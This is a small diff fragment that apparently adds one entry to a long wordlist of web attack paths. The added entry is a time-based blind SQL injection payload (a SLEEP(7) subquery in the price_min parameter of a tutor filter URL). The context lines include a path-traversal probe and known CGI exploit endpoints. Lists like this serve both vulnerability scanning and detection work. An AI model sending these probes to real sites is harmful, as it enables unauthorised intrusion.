@@ -9922,3 +9922,4 @@ a
 /api/v1/cav/client/status/../../admin/options
 /cgi-bin/quick/quick.cgi?func=switch_os&todo=uploaf_firmware_image
 /cgi-bin/quick/GrGaTl
+/tutor/filter?searched_word&searched_tution_class_type[]=1&price_min=(SELECT(0)FROM(SELECT(SLEEP(7)))a)&price_max=9&searched_price_type[]=hourly&searched_duration[]=0
